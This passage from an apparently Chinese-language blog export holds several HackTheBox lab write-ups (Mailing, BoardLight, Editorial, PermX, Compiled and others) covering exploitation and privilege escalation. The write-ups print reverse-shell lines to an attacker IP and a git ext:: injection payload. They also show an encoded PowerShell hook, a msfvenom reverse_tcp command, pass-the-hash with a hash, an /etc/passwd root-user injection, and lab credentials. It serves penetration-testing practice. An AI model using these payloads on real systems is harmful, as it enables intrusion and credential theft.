å­˜åœ¨å¹¶ä¸”åœ¨å¯¼å…¥æ—¶ä¼˜å…ˆè¢«åŠ è½½ï¼Œå°±ä¼šæ‰§è¡Œå…¶ä¸­çš„ä»£ç ã€‚ç”±äºä½ åœ¨ torch.py ä¸­ç›´æ¥è°ƒç”¨äº† os.system(\u0026quot;bash\u0026quot;)ï¼Œå¯¼è‡´ç›´æ¥å¯åŠ¨äº†ä¸€ä¸ª Bash Shell\nSummary #\rè™½ç„¶ç½‘ä¸Šæœ‰å…¶ä»–çš„wpï¼Œä½†æ˜¯è¿™ä¸ªæå‡æƒé™çš„æ€è·¯åº”è¯¥æ˜¯æœ€ç®€å•çš„\nåˆ©ç”¨æ–‡ä»¶è¦†ç›–å¯¼å…¥æ‰§è¡Œï¼Œåº”è¯¥ç®—æ˜¯pythonè¯­è¨€çš„ç‰¹æ€§é—®é¢˜\nè¯´å®è¯ï¼Œè¿™ç§æ€è·¯çœŸçš„ä¸€èˆ¬æƒ³ä¸åˆ°\n","date":"2024-09-11","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-blurry/","section":"Posts","summary":"","title":"HTB-Blurry","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O sightless.htb å¼€æ”¾ç«¯å£ï¼š21ã€22ã€80\nWebæœåŠ¡å™¨ï¼šnginx 1.18.0\nFTPæœåŠ¡å™¨ï¼šProFTPD\nDirsearch #\rdirsearch -u sightless.htb -t 50 Gobuster #\rgobuster dir -u http://sightless.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 CVE-2022-0944 #\råœ¨ç½‘é¡µä¸­å‘ç°ä¸€ä¸ªsqlpadå­åŸŸåï¼Œä¼¼ä¹å¯ä»¥è¿›è¡Œsqlæ“ä½œï¼Œä½†æ˜¯é¶æœºçš„3306ç«¯å£æ˜¯å…³é—­çš„\nåœ¨å³ä¸Šè§’ç‚¹å‡»å‘ç°SQLpadçš„ç›¸å…³ä¿¡æ¯ï¼š6.10.0\nGithubï¼šworm-403/scripts (github.com)\nåªéœ€è¦æŒ‡å®šæ”»å‡»æœºçš„IPå’Œç«¯å£å³å¯\nåœ¨rootç”¨æˆ·ä¸‹å¹¶æ²¡æœ‰æ‰¾åˆ°ä¸œè¥¿\nåœ¨/etc/shadowï¼Œä¸­å‘ç°michaelçš„å¯†ç hash\nä½¿ç”¨hashcatçˆ†ç ´\nç™»å½•michaelçš„è´¦å·è·å¾—user.txt\nç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œåå¼¹è·å¾—çš„shellè™½ç„¶æ˜¯rootæƒé™ï¼Œä½†æ˜¯ä¸€éƒ¨åˆ†æŒ‡ä»¤æ˜¯æ— æ³•æ‰§è¡Œçš„\nPrivilege Escalation #\rä¸Šä¼ linpeasï¼Œå‘ç°bashä¼¼ä¹å¯ä»¥ç”¨æ¥ææƒ\nç›¸å…³æ–‡ç« ï¼šLinuxææƒâ€”â€”â€”â€”åˆ©ç”¨SUIDææƒ_bashææƒ-CSDNåšå®¢\nè¿™äº›å‘½ä»¤éƒ½æœ‰rootæƒé™\nä½¿ç”¨bashå¼€å¯æ–°çš„shellè¿›ç¨‹ï¼Œå³å¯çœ‹åˆ°æƒé™æ˜¯root\nè·å–åˆ°root.txt\nSummary #\ræ€»ä½“æ¥è¯´æ¯”è¾ƒç®€å•\næ¶‰åŠåˆ°ä¸€ç‚¹Linuxææƒ\n","date":"2024-09-10","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-sightless/","section":"Posts","summary":"","title":"HTB-Sightless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O -Pn mailing.htb å¼€æ”¾ç«¯å£ï¼š25ã€80ã€110ã€135ã€139ã€143ã€445ã€465ã€587ã€993\nServerï¼šhMailServer\nDirsearch #\rdirsearch -u mailing.htb -t 50 è¿›å…¥http://mailing.htb\nç‚¹å‡»Downloadï¼Œå°±æ˜¯/download.php\nDirectory Traversal #\rè¿›è¡ŒæŠ“åŒ…ï¼Œå‘ç°å¯ä»¥ä¸‹è½½æ–‡ä»¶\nå°è¯•ä¿®æ”¹fileå‚æ•°ï¼ŒæˆåŠŸå¾—åˆ°hostsæ–‡ä»¶\nç›®å‰è¿™ä¸ªphpæ–‡ä»¶è‡³å°‘èƒ½å¤Ÿè¯»å–æ–‡ä»¶\nç”±äºåˆšæ‰Nmap ï¼Œæ‰«æå‡ºæ¥é‚®ä»¶æœåŠ¡æ˜¯hMailServer\nç»è¿‡æœç´¢ä»¥åŠChatGPTï¼Œè·å–åˆ°è·¯å¾„ä¸ºï¼šC:\\Program Files (x86)\\hMailServer\\Bin\\hMailServer.ini\nMD5è§£å¯†åè·å¾—æ˜æ–‡ï¼šhomenetworkingadministrator\nå›åˆ°ä¹‹å‰çš„instruction.pdfï¼Œåœ¨endingé‚£é‡Œï¼Œå‘é€ç¬¬ä¸€å°é‚®ä»¶ä¹‹åï¼ŒMayaä¼šè¯»å–æˆ‘ä»¬çš„é‚®ä»¶\né€šè¿‡pop3ç«¯å£è¿æ¥é‚®ç®±ï¼Œä¸è¿‡é‡Œé¢ä»€ä¹ˆéƒ½æ²¡æœ‰\nCVE-2024-21413 #\rGithubï¼š\nå…ˆæ‰“å¼€ç›‘å¬å™¨\nresponder -I tun0 -v è¿è¡Œpoc\npython3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url \u0026#39;\\\\10.10.16.8\\PoC\u0026#39; --subject \u0026#34;Hello world\u0026#34; åœ¨ç›‘å¬å™¨å¤„æ”¶åˆ°hashï¼Œå°è¯•è§£å¯†\nå¾—åˆ°mayaçš„å¯†ç ï¼šm4y4ngs4ri\nç”±äºsshç«¯å£æ²¡æœ‰å¼€ï¼Œä¸è¿‡å¯ä»¥æµ‹è¯•winrmçš„ç«¯å£5985\nEvil Winrm #\revil-winrm -i mailing.htb -u maya -p \u0026#39;m4y4ngs4ri\u0026#39; æˆåŠŸè¿›å…¥ã€‚\nåœ¨æ¡Œé¢æ‹¿åˆ°user.txt\nPrivilege Escalation #\råœ¨Program Files æ–‡ä»¶å¤¹ä¸‹å‘ç°ä¸€ä¸ªLibreOffice\nå°†å…¶Licenseæ–‡ä»¶ä¸‹è½½ä¸‹æ¥çœ‹\nåœ¨readmeä¸­å‘ç°ç‰ˆæœ¬ä¿¡æ¯\nCVE-2023-2255 #\rGithubï¼šelweth-sec/CVE-2023-2255: CVE-2023-2255 Libre Office (github.com)\nå‘ç°Cç›˜ä¸‹é¢çš„Important Documentæ–‡ä»¶å¤¹å…·æœ‰ç‰¹æ®Šæƒé™\nç®¡ç†å‘˜å’Œç³»ç»Ÿè´¦æˆ·å¯¹ç›®å½•æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚Mayaç”¨æˆ·å’Œå·²è®¤è¯ç”¨æˆ·å¯¹ç›®å½•å…·æœ‰ä¿®æ”¹æƒé™ã€‚\npython3 CVE-2023-2255.py --cmd \u0026#39;net localgroup Administradores maya /add\u0026#39; --output \u0026#39;exploit.odt\u0026#39; ç›´æ¥æŠŠmayaåŠ åˆ°ç®¡ç†å‘˜ç»„é‡Œé¢å»\nç¨ç­‰ä¸€ä¼š\nä½¿ç”¨crackmapexecæ¥è·å–localadminçš„å“ˆå¸Œå€¼\ncrackmapexec smb 10.10.11.14 -u maya -p \u0026#34;m4y4ngs4ri\u0026#34; --sam æœ€åä½¿ç”¨impacket-wmiexecä¼ å…¥hashå€¼ç™»å½•\nimpacket-wmiexec localadmin@mailing.htb -hashes \u0026#34;aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae\u0026#34; Summary #\rCVE-2024-21413è·å–hashåŸç†ï¼šåœ¨é‚®ä»¶çš„ --url å‚æ•°ä¸­æŒ‡å®šäº†ä¸€ä¸ª UNC è·¯å¾„ï¼ˆ\\\\10.10.16.8\\PoCï¼‰ã€‚UNC è·¯å¾„é€šå¸¸ç”¨äºç½‘ç»œå…±äº«ï¼Œå½“ç›®æ ‡ç³»ç»Ÿå¤„ç†è¿™ä¸ªè·¯å¾„æ—¶ï¼Œå®ƒä¼šå°è¯•ä¸æŒ‡å®šçš„æœåŠ¡å™¨ï¼ˆ10.10.16.8ï¼‰å»ºç«‹è¿æ¥ã€‚\nåœ¨ Windows ç³»ç»Ÿä¸­ï¼Œå½“ç³»ç»Ÿå°è¯•è®¿é—® UNC è·¯å¾„æ—¶ï¼Œå®ƒå¯èƒ½ä¼šè‡ªåŠ¨å°è¯•è¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™ä¸ªèº«ä»½éªŒè¯è¿‡ç¨‹ä¸­ï¼ŒWindows ä¼šå‘é€ NTLMv2 å“ˆå¸Œæ¥éªŒè¯ç”¨æˆ·èº«ä»½ã€‚å¦‚æœ responder æ­£åœ¨ç›‘å¬è¿™ä¸ªç½‘ç»œè¯·æ±‚ï¼Œå®ƒå¯ä»¥æ•è·è¿™äº›å“ˆå¸Œå€¼ã€‚\nå¦‚æœè¿™äº›å“ˆå¸Œå€¼èƒ½å¤Ÿè¢«ç ´è§£ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿç™»å½•ç›¸åº”çš„æœåŠ¡æˆ–è€…ç³»ç»Ÿã€‚\nNTLM å“ˆå¸Œè®¤è¯æœºåˆ¶çš„ç‰¹æ€§ï¼šNTLM è®¤è¯é€šå¸¸ä¸ SMBåè®®é…åˆä½¿ç”¨ï¼Œé€šå¸¸ä¼šä½¿ç”¨ TCP 445 ç«¯å£è¿›è¡Œé€šä¿¡ã€‚NTLM è®¤è¯çš„æœºåˆ¶å…è®¸é€šè¿‡å¯†ç çš„å“ˆå¸Œå€¼è¿›è¡Œèº«ä»½éªŒè¯ï¼Œimpacket-wmiexecä½¿ç”¨ NT å“ˆå¸Œï¼ˆé€šè¿‡ Pass-the-Hash æŠ€æœ¯ï¼‰æ¥æ¨¡æ‹Ÿç”¨æˆ·èº«ä»½ï¼Œä»è€Œæ— éœ€è¾“å…¥å¯†ç å°±èƒ½æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚\nwindowsçš„é¢˜ç›®è¿˜æ˜¯æ¥è§¦å¤ªå°‘äº†ğŸ˜¥\n","date":"2024-09-05","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-mailing/","section":"Posts","summary":"","title":"HTB-Mailing","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O boardlight.htb å¼€æ”¾ç«¯å£ï¼š22ã€80\nServerï¼šApache 2.4.41 (Ubuntu)\nDirsearch #\rdirsearch -u boardlight.htb -t 50 Subdomain Fuzzing #\råœ¨é¡µå°¾å‘ç°ä¸€ä¸ªï¼šBoard.htb\nä¿®æ”¹ /etc/hosts\nffuf -w main.txt -u http://board.htb -H \u0026#34;Host:FUZZ.board.htb\u0026#34; -ac è·å¾—å­åŸŸåï¼šcrm\nå¹¶ä¸”æ›´æ–° /etc/hosts\nWeak Auth #\rè¿›å…¥crm.board.htb\nç”¨æˆ·åå¯†ç ï¼šadminï¼Œadmin\nCVE-2023-30253 #\rGithubï¼šdollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253\næ·»åŠ ç«™ç‚¹ä»¥åŠé¡µé¢\nå°è¯•ä¿®æ”¹æºç ï¼Œå›æ˜¾æˆåŠŸ\n\u0026lt;?pHp exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt; /dev/tcp/10.10.16.8/100 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; æ‹¿åˆ°shell\nè¿™é‡Œä½¿ç”¨pythonè„šæœ¬æ¥ç®€åŒ–ã€‚\nä¸Šä¼ linpeas.sh ï¼Œå¹¶ä¸”æ‰§è¡Œ\nå‘ç°å­˜åœ¨3306ç«¯å£ï¼Œå¹¶ä¸”åœ¨confé‡Œæ‰¾åˆ°ç™»é™†å¯†ç \n$dolibarr_main_db_host=\u0026#39;localhost\u0026#39;;\r$dolibarr_main_db_port=\u0026#39;3306\u0026#39;;\r$dolibarr_main_db_name=\u0026#39;dolibarr\u0026#39;;\r$dolibarr_main_db_prefix=\u0026#39;llx_\u0026#39;;\r$dolibarr_main_db_user=\u0026#39;dolibarrowner\u0026#39;;\r$dolibarr_main_db_pass=\u0026#39;serverfun2$2023!!\u0026#39;;\r$dolibarr_main_db_type=\u0026#39;mysqli\u0026#39;;\r$dolibarr_main_db_character_set=\u0026#39;utf8\u0026#39;;\r$dolibarr_main_db_collation=\u0026#39;utf8_unicode_ci\u0026#39;; æŸ¥è¯¢userè¡¨\næ ¼å¼åŒ–ä¸€ä¸‹\n| rowid | entity | ref_employee | ref_ext | admin | employee | fk_establishment | datec | tms | fk_user_creat | fk_user_modif | login | pass_encoding | pass_crypted | pass_temp | api_key | gender | civility | lastname | firstname | address | zip | town | fk_state | fk_country | birth | birth_place | job | office_phone | office_fax | user_mobile | personal_mobile | email | personal_email | signature | socialnetworks | fk_soc | fk_socpeople | fk_member | fk_user | fk_user_expense_validator | fk_user_holiday_validator | idpers1 | idpers2 | idpers3 | note_public | note_private | model_pdf | datelastlogin | datepreviouslogin | datelastpassvalidation | datestartvalidity | dateendvalidity | iplastlogin | ippreviouslogin | egroupware_id | ldap_sid | openid | statut | photo | lang | color | barcode | fk_barcode_type | accountancy_code | nb_holiday | thm | tjm | salary | salaryextra | dateemployment | dateemploymentend | weeklyhours | import_key | default_range | default_c_exp_tax_cat | national_registration_number | fk_warehouse |\r|-------|--------|--------------|---------|-------|----------|------------------|---------------------|---------------------|---------------|---------------|----------|---------------|----------------------------------------------------------------------------------------------------|------------|---------|--------|----------|------------|-----------|---------|------|-------|----------|------------|-------|-------------|-----|--------------|------------|-------------|-----------------|-------|----------------|-----------|----------------|---------|--------------|---------|---------|---------------------------|---------------------------|---------|---------|---------|-------------|--------------|-----------|---------------------|----------------------|-----------------------|-------------------|-----------------|--------------|-----------------|---------------|----------|--------|--------|-------|-------|---------|----------------|------------------|-------------|-----|-----|---------|--------------|-------------------|---------------------|-------------|------------|---------------|----------------------|-------------------------------|--------------|\r| 1 | 0 | NULL | NULL | 1 | 1 | 0 | 2024-05-13 13:21:56 | 2024-05-13 13:21:56 | NULL | NULL | dolibarr | NULL | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | NULL | NULL | NULL | NULL | SuperAdmin | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | 2024-05-15 09:57:04 | 2024-05-13 23:23:59 | NULL | NULL | NULL | 10.10.14.31 | 10.10.14.41 | NULL | NULL | NULL | 1 | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL |\r| 2 | 1 | NULL | NULL | 0 | 1 | 0 | 2024-05-13 13:24:01 | 2024-05-15 09:58:40 | NULL | NULL | admin | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | yr6V3pXd9QEI | NULL | NULL | NULL | admin | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | 2024-09-03 20:37:39 | 2024-09-03 20:04:27 | NULL | NULL | NULL | 10.10.16.8 | 10.10.16.24 | NULL | NULL | NULL | 1 | NULL | NULL | NULL | NULL | NULL | NULL | NULL| NULL| NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | NULL | è¿™é‡Œæˆ‘ä½¿ç”¨hashcatçˆ†ç ´å¤±è´¥ï¼Œå°è¯•å°†mysqlçš„å¯†ç ä½œä¸ºsshçš„å¯†ç ç™»å½•æˆåŠŸï¼Œå¹¶ä¸”å¾—åˆ°user.txtã€‚\nsudo -l ï¼Œå¹¶æ²¡æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ã€‚\nCVE-2022-37706 #\rGithubï¼šMaherAzzouzi/CVE-2022-37706-LPE-exploit\nåœ¨Files with Interesting Permissions ï¼Œé‡Œå‘ç°ä¸€ä¸ªenlightenmentçš„ä¸œè¥¿\nå°†exploit.sh ï¼Œä¸‹è½½ä¸‹æ¥æ‰§è¡Œï¼Œè·å–åˆ°rootæƒé™ã€‚\nSummary #\rç«¯å£æ‰«æã€å­åŸŸåæ‰«æã€ç›®å½•æ‰«ææ˜¯æ ‡å‡†çš„å‰ç½®è¿‡ç¨‹ã€‚\né’ˆå¯¹ç½‘ç«™ç»†èŠ‚ä¿¡æ¯è¿›è¡Œæœé›†è·å–CVEã€‚\nLinpeasæš´éœ²å‡ºçš„ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ã€‚\nHashcatä¸ä¸€å®šèƒ½å¤Ÿçˆ†ç ´å‡ºæ­£ç¡®çš„æ˜æ–‡ã€‚\n","date":"2024-09-04","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-boardlight/","section":"Posts","summary":"","title":"HTB-BoardLight","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O editorial.htb å¼€æ”¾ç«¯å£ï¼š**22**ã€**80**\nServerï¼š**nginx 1.18.0** ï¼ˆUbuntuï¼‰\nDirsearch #\rdirsearch -u editorial.htb -t 50 è®¿é—®ï¼šhttp://editorial.htb/upload\nSSRF #\rBurpsuiteå¼€å¯æ‹¦æˆªï¼Œç‚¹å‡»Preview\nå¹¶ä¸”å¯ä»¥è®¿é—®\nç”±äºå…è®¸è¾“å…¥urlï¼Œè¿™é‡Œå°è¯•ï¼š127.0.0.1ï¼ŒæˆåŠŸå¾—åˆ°å›æ˜¾ã€‚\nå°è¯•éå†ç«¯å£æœåŠ¡\nå½“ç«¯å£ä¸º5000æ—¶ï¼Œå“åº”åŒ…å‡ºç°ä¸åŒ\nè®¿é—®ä¸‹è½½åˆ°ä¸€ä¸ªæ–‡ä»¶\nsudo apt install jq\rcat file | jq æŸ¥çœ‹authorsçš„api\n{\r\u0026#34;template_mail_message\u0026#34;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: dev\\nPassword: dev080217_devAPI!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, Editorial Tiempo Arriba Team.\u0026#34; } Usernameï¼šdev\nPasswordï¼šdev080217_devAPI!@\nsshç™»å½•ï¼Œè·å–åˆ°user.txt\nPrivildge Escalation #\rå‘ç°éšè—çš„gitç›®å½•\næŸ¥çœ‹git log\n\u0026#39;template_mail_message\u0026#39;: \u0026#34;Welcome to the team! We are thrilled to have you on board and can\u0026#39;t wait to see the incredible content you\u0026#39;ll bring to the table.\\n\\nYour login credentials for our internal forum and authors site are:\\nUsername: prod\\nPassword: 080217_Producti0n_2023!@\\nPlease be sure to change your password as soon as possible for security purposes.\\n\\nDon\u0026#39;t hesitate to reach out if you have any questions or ideas - we\u0026#39;re always here to support you.\\n\\nBest regards, \u0026#34; + api_editorial_name + \u0026#34; Team.\u0026#34; Usernameï¼šprod\nPasswordï¼š080217_Producti0n_2023!@\nssh prod@editorial.htb cat /opt/internal_apps/clone_changes/clone_prod_change.py\r#!/usr/bin/python3\rimport os\rimport sys\rfrom git import Repo\ros.chdir(\u0026#39;/opt/internal_apps/clone_changes\u0026#39;)\rurl_to_clone = sys.argv[1]\rr = Repo.init(\u0026#39;\u0026#39;, bare=True)\rr.clone_from(url_to_clone, \u0026#39;new_changes\u0026#39;, multi_options=[\u0026#34;-c protocol.ext.allow=always\u0026#34;]) è¿™ä¸ªpythonè„šæœ¬å¯ä»¥æŒ‡å®šä¸€ä¸ªå‚æ•°è¿›è¡Œä»“åº“å…‹éš†ã€‚\nCVE-2022-24439 #\rGit å…è®¸è‡ªå®šä¹‰åè®®æ‰©å±•ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥å®šä¹‰è‡ªå·±çš„åè®®æ¥å¤„ç†ç‰¹å®šçš„æ“ä½œã€‚é€šè¿‡è¿™ç§æœºåˆ¶ï¼Œç”¨æˆ·å¯ä»¥æ³¨å†Œè‡ªå·±çš„åè®®å¤„ç†ç¨‹åºï¼Œå¦‚ ext::ã€‚å½“ Git é‡åˆ°è¿™ç§åè®®æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ä¸ä¹‹å…³è”çš„å‘½ä»¤ã€‚\nç™¾åˆ†å·%å¯ä»¥ç†è§£ä¸ºç©ºæ ¼\nprod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py \u0026#39;ext::sh -c touch% /tmp/hyh\u0026#39; æˆåŠŸå†™å…¥æ–‡ä»¶\nåŒæ ·æ–¹å¼å†™å…¥åå¼¹shell\nprod@editorial:/opt/internal_apps/clone_changes$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.8/100 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;/tmp/revshell.sh\rprod@editorial:/opt/internal_apps/clone_changes$ sudo /usr/bin/python3 /opt/internal_apps/clone_chane_prod_change.py \u0026#39;ext::sh -c cat% /tmp/revshell.sh|bash\u0026#39;\râ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Downloads]\râ””â”€# nc -lvnp 100 Summary #\rç›®å½•æ‰«æå‡ºuploadé¡µé¢\nURLè¾“å…¥æ¡†å­˜åœ¨SSRFæ¼æ´ï¼Œæ ¹æ®ç«¯å£æ‰«æå¹¶å¾—åˆ°å¤‡ä»½æ–‡ä»¶\nGit Log ä¿¡æ¯æ³„éœ²è·å¾—prodç”¨æˆ·æƒé™\nprodå­˜åœ¨å¯ä»¥sudoæ‰§è¡Œçš„æ–‡ä»¶ï¼ŒCVE-2022-24439\nå…ˆå†™å…¥åå¼¹shellæ–‡ä»¶ï¼Œå†ç”¨CVEè¿›è¡Œä»»æ„æ–‡ä»¶æ‰§è¡Œï¼Œè·å–rootæƒé™\n","date":"2024-09-03","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-editorial/","section":"Posts","summary":"","title":"HTB-Editorial","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnamp 10.10.11.23 -A -O Opened Portsï¼š22ã€80\nServerï¼šApache 2.4.52 (Ubuntu)\nSubdomain Fuzzing #\rGithubï¼šTheKingOfDuck/fuzzDicts: Web Pentesting (github.com)\nffuf -w main.txt -u http://permx.htb/ -H \u0026#34;Host:FUZZ.permx.htb\u0026#34; -mc 200 æ‰¾åˆ°ä¸¤ä¸ªå­åŸŸåï¼šwwwã€lms\næ›´æ–°**/etc/hosts**\nDirsearch #\rdirsearch -u http://permx.htb/ dirsearch -u lms.permx.htb åœ¨LICENSEé‡Œå¾—åˆ°Chamilo LMSçš„ç‰ˆæœ¬ä¿¡æ¯\nGobuster #\rgobuster dir -u http://permx.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 CVE-2023-4220 #\rGithubï¼šRai2en/CVE-2023-4220-Chamilo-LMS: CVE-2023-4220 (github.com)\næˆåŠŸä¸Šä¼ webshell\nä»¥åŠåå¼¹shell\nå‘ç°mysqlç”¨æˆ·åä»¥åŠå¯†ç \nmysql -u chamilo -p03F6lY3uXAP2bkW8\rselect username,password from user; å°è¯•è¿›è¡Œçˆ†ç ´ï¼Œå¤±è´¥ã€‚\nå­˜åœ¨ä¸€ä¸ªmtzçš„ç”¨æˆ·ï¼Œå°è¯•ç”¨æ•°æ®åº“çš„å¯†ç è¿›è¡Œsshç™»å½•ï¼ŒæˆåŠŸã€‚\nPrivilege Escalation #\rè¿™ä¸ªè„šæœ¬ç”¨äºç¡®ä¿å®‰å…¨åœ°ä¸º /home/mtz/ ç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶è®¾ç½®ç‰¹å®šç”¨æˆ·çš„æƒé™ï¼Œé˜²æ­¢æœªç»æˆæƒçš„ç›®å½•è®¿é—®æˆ–æ“ä½œã€‚\ntouch test\rln -sf /etc/passwd /home/mtz/test # å°†testé“¾æ¥åˆ°/etc/passwd\rsudo /opt/acl.sh mtz rw /home/mtz/test #ç»™testæ–‡ä»¶è®¾ç½®ä¸ºmtzï¼Œå¹¶ä¸”å¯è¯»å¯å†™\recho \u0026#34;hyh::0:0:hyh:/root:/bin/bash\u0026#34; \u0026gt;\u0026gt; ./test #å°†ç”¨æˆ·ä¿¡æ¯å†™å…¥test\rsu hyh Summary #\rç«¯å£ã€å­åŸŸåæ‰«æè·å–webæœåŠ¡ç›¸å…³ä¿¡æ¯ã€‚ä»CVEå…¥æ‰‹è·å–åˆ°æ™®é€šshellæƒé™ã€‚\nåœ¨/opt/acl.shä¸­å¯ä»¥æ„é€ è½¯é“¾æ¥ï¼Œå°†å†™å…¥çš„ç”¨æˆ·ä¿¡æ¯é“¾æ¥åˆ°/etc/passwdå³å¯è·å–rootæƒé™ã€‚\n","date":"2024-09-03","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-permx/","section":"Posts","summary":"","title":"HTB-PermX","type":"posts"},{"content":"\rBox Info #\rOS Windows Rated Difficulty Medium Port Scan #\r#linux\rnmap -A -Pn 10.10.11.26 æ‰«æå‡ºæ¥3000å’Œ5000ç«¯å£ã€‚\n3000ç«¯å£æ˜¯ä¸€ä¸ªç±»ä¼¼äºgitçš„æœåŠ¡ï¼Œå…·ä½“æ˜¯ç”±Giteaé©±åŠ¨çš„ã€‚åŒ…å«äº†æ³¨å†Œã€ç™»å½•ã€åˆ›å»ºä»“åº“ä»¥åŠæ‹‰å–ä»£ç ç­‰ç­‰åŠŸèƒ½ã€‚\n5000ç«¯å£æ˜¯ä¸€ä¸ªç±»ä¼¼äºç¼–è¯‘åŠŸèƒ½ï¼Œå¯ä»¥ä¼ å…¥ä»“åº“åœ°å€ã€‚\nGit Rce #\råœ¨3000ç«¯å£ä¸Šçš„richardçš„Calculatorä»“åº“ä¸­ï¼Œå‘ç°äº†gitçš„ç‰ˆæœ¬æ˜¯2.45.0\nç»“åˆ5000ç«¯å£ä¸Šçš„cloneåŠŸèƒ½ï¼Œæœç´¢å¾—åˆ°æ¼æ´ç¼–å·ä¸ºï¼šCVE-2024-32002 çš„git rceæ¼æ´ã€‚\nç›¸å…³æ–‡ç« ï¼šExploiting CVE-2024-32002: RCE via git clone | Amal Murali\næ–‡ç« ä¸­çš„ç¤ºä¾‹è„šæœ¬ä¸­æ˜¯æ‰“å¼€ä¸€ä¸ªè®¡ç®—å™¨ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå¯ä»¥æŠŠä»–æ”¹ä¸ºåå¼¹shellã€‚\næ ¹æ®æ–‡ç« ä¸­çš„æè¿°ï¼Œéœ€è¦åˆ›å»ºä¸¤ä¸ªç©ºä»“åº“ã€‚\ngit config --global protocol.file.allow always\rgit config --global core.symlinks true\rgit config --global init.defaultBranch main\rrm -rf nothing\rrm -rf toSeeHere\rgit clone http://compiled.htb:3000/hyh/repo1.git\rcd repo1\rmkdir -p y/hooks\rcat \u0026gt;y/hooks/post-checkout \u0026lt;\u0026lt;EOF\r#!bin/sh.exe\rpowershell -e JABjAGw...\rEOF\rchmod +x y/hooks/post-checkout\rgit add y/hooks/post-checkout\rgit commit -m \u0026#34;post-checkout\u0026#34;\rgit push\rcd ..\rgit clone http://compiled.htb:3000/hyh/repo2.git\rcd repo2\rgit submodule add --name x/y \u0026#34;http://compiled.htb:3000/hyh/repo1.git\u0026#34; A/modules/x\rgit commit -m \u0026#34;add-submodule\u0026#34;\rprintf \u0026#34;.git\u0026#34; \u0026gt;dotgit.txt\rgit hash-object -w --stdin \u0026lt;dotgit.txt \u0026gt;dot-git.hash\rprintf \u0026#34;120000 %s 0\\ta\\n\u0026#34; \u0026#34;$(cat dot-git.hash)\u0026#34; \u0026gt;index.info\rgit update-index --index-info \u0026lt;index.info\rgit commit -m \u0026#34;add-symlink\u0026#34;\rgit push å¡«å……åˆ°powershellé‚£é‡Œæ¥åå¼¹shellã€‚\nç„¶åæœ¬åœ°è¿è¡Œè¿™ä¸ªshè„šæœ¬\nè¿™è¾¹å‡†å¤‡æäº¤repo2çš„ä»£ç ,å¹¶ä¸”ç›‘å¬4321ç«¯å£\næˆåŠŸåå¼¹åˆ°shell\næŸ¥çœ‹ç”µè„‘çš„ç”¨æˆ·,å‘ç°ä¸€ä¸ªEmilyç”¨æˆ·\nåœ¨Cç›˜Program Files\\Giteaçš„dataç›®å½•ä¸‹å‘ç°ä¸€ä¸ªgitea.dbæ•°æ®æ–‡ä»¶\nè¿™é‡Œæ— æ³•ç›´æ¥ä¸‹è½½,è¦åœ¨kaliä¸Šç”¨metasploitç”Ÿæˆæœ¨é©¬è¿›è¡Œæ§åˆ¶.\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.24 lport=9876 -f exe -o shell.exe 